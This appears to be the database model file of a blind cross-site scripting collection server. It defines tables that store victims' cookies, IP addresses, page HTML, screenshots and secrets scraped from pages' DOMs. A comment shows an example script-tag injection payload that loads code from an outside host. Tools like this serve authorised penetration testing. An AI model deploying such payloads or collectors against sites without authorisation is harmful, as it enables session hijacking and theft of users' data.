const Sequelize = require('sequelize');
const uuid = require('uuid');

const get_secure_random_string = require('./utils.js').get_secure_random_string;
const get_hashed_password = require('./utils.js').get_hashed_password;
const constants = require('./constants.js');

const sequelize = new Sequelize(
	process.env.DATABASE_NAME,
	process.env.DATABASE_USER,
	process.env.DATABASE_PASSWORD,
	{
		host: process.env.DATABASE_HOST,
		dialect: 'postgres',
		benchmark: true,
		logging: false,
		dialectOptions: {
			socketPath: process.env.NODE_ENV == 'production' ? process.env.DATABASE_HOST : null,
		},
	},
);

const Model = Sequelize.Model;

/*
    Secrets found in DOMs
*/
class Users extends Model {}
Users.init({
 	id: {
		allowNull: false,
		primaryKey: true,
		type: Sequelize.UUID,
		defaultValue: uuid.v4()
	},   
    email: {
        type: Sequelize.TEXT,
        allowNull: false,
        unique: true
    },
    path: {
        type: Sequelize.TEXT,
        allownull: true,
        unique: true
    },
    injectionCorrelationAPIKey: {
        type: Sequelize.TEXT,
        allownull: true,
        unique: true
    },
    additionalJS: {
        type: Sequelize.TEXT,
        allownull: true,
    },
    sendEmailAlerts: {
        type: Sequelize.BOOLEAN,
        allownull: false,
        defaultValue: true,
    }


}, {
	sequelize,
	modelName: 'users',
	indexes: [
		{
			unique: false,
			fields: ['email'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['path'],
			method: 'BTREE',
		}
]
});


/*
    Secrets found in DOMs
*/
class Secrets extends Model {}
Secrets.init({
 	id: {
		allowNull: false,
		primaryKey: true,
		type: Sequelize.UUID,
		defaultValue: uuid.v4()
	},   
    payload_id: {
        type: Sequelize.TEXT,
        allowNull: false,
        unique: false
    },
    secret_type: {
        type: Sequelize.TEXT,
        allowNull: false,
        unique: false
    },
    secret_value: {
        type: Sequelize.TEXT,
        allowNull: true,
        unique: false
    }
}, {
	sequelize,
	modelName: 'secrets',
	indexes: [
		{
			unique: false,
			fields: ['secret_type'],
			method: 'BTREE',
		},
        {
            unique: false,
            fields: ['secret_value'],
            method: 'BTREE'
        }
    ]
});
	
/*
	XSS payload fire results
*/
class PayloadFireResults extends Model {}
PayloadFireResults.init({
	id: {
		allowNull: false,
		primaryKey: true,
		type: Sequelize.UUID,
		defaultValue: uuid.v4()
	},
	// URL the XSS payload fired on.
	url: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
    // The id of the user who the payload goes with
	user_id: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// IP address of the user that
	// triggered the XSS payload fire.
	ip_address: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// The referer for the page the
	// XSS payload fired on.
	referer: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// User-Agent of the browser for
	// the user who triggered the XSS
	// payload fire.
	user_agent: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// Cookies of the user for the domain
	// the payload fired on.
	// Obviously, this excludes HTTPOnly
	cookies: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// Title of the page which the payload fired on.
	title: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// HTTP origin of the page (e.g.
	// https://example.com)
	origin: {
		type: Sequelize.TEXT,
		allowNull: false,
		unique: false
	},
	// Random ID of the screenshot
	screenshot_id: {
		type: Sequelize.TEXT,
		allowNull: true,
		unique: false
	},
	// Whether the payload fired inside
	// of an iframe or not.
	was_iframe: {
		type: Sequelize.BOOLEAN,
		allowNull: false,
		unique: false
	},
	// Timestamp as reported by the
	// user's browser
	browser_timestamp: {
		type: Sequelize.BIGINT,
		allowNull: false,
		unique: false
	},
    // git directory exposed
	gitExposed: {
		type: Sequelize.TEXT,
		allowNull: true,
		unique: false
	},
    // cors data
	CORS: {
		type: Sequelize.TEXT,
		allowNull: true,
		unique: false
	},
}, {
	sequelize,
	modelName: 'payload_fire_results',
	indexes: [
		{
			unique: false,
			fields: ['url'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['CORS'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['user_id'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['ip_address'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['referer'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['user_agent'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['cookies'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['title'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['origin'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['was_iframe'],
			method: 'BTREE',
		},
		{
			unique: false,
			fields: ['browser_timestamp'],
			method: 'BTREE',
		}
	]
});

let savePayload = async function(inbound_payload){
    let payload = await PayloadFireResults.create(inbound_payload);
    for (const secret of inbound_payload.secrets){
        secret.payload_id = payload.id;
        await Secrets.create(secret);
    }
    return payload
}

class CollectedPages extends Model {}
CollectedPages.init({
	id: {
		allowNull: false,
		primaryKey: true,
		type: Sequelize.UUID,
		defaultValue: uuid.v4()
	},
	// URL of the collected page
	uri: {
		type: Sequelize.TEXT,
		allowNull: false,
	},
	// HTML response of page
	html: {
		type: Sequelize.TEXT,
		allowNull: true,
	},
}, {
	sequelize,
	modelName: 'collected_pages',
	indexes: [
		{
			unique: false,
			fields: ['uri'],
			method: 'BTREE',
		}
	]
});


class InjectionRequests extends Model {}
InjectionRequests.init({
	id: {
		allowNull: false,
		primaryKey: true,
		type: Sequelize.UUID,
		defaultValue: uuid.v4()
	},
	/*
		The full text of the request for a given
		injection attempt. For example, if you're
		doing an HTTP request with an XSS payload
		in a header, you'd include the full request.

		This isn't necessarily exclusive to HTTP. Any
		protocol can be used so long as it's converted
		to text and the information is sent to the API.

		(Must be text just so it can be displayed in
		the final XSS payload fire report).
	*/
	request: {
		type: Sequelize.TEXT,
		allowNull: false,
	},
	/*
		Each injection attempt has a unique shortkey
		which is used to correlate the attempt with
		the resulting XSS payload fire. By using this
		functionality you can always know what request
		you did which resulted in a given XSS payload fire.

		These unique shortkeys look like the following:

		<script src="https://xss.express/mwnba6k2"></script>

		In the above payload, "mwnba6k2" is the shortkey used
		to track injection attempts. In practice, users will
		utilize a tool which automatically generates these IDs
		and sends the injeciton request details to the API.
	*/
	injection_key: {
		type: Sequelize.TEXT,
		allowNull: false,
	},
}, {
	sequelize,
	modelName: 'injection_requests',
	indexes: [
		{
			unique: true,
			fields: ['injection_key'],
			method: 'BTREE',
		}
	]
});

async function database_init() {
	const force = false;

	// Set up database schema
	await Promise.all([
		PayloadFireResults.sync({ force: force }),
		Users.sync({ force: force }),
		Secrets.sync({ force: force }),
		CollectedPages.sync({ force: force }),
		InjectionRequests.sync({ force: force }),
	]);
}

module.exports = {
	sequelize,
	PayloadFireResults,
	CollectedPages,
	InjectionRequests,
	database_init,
    savePayload,
    Secrets,
    Users
}
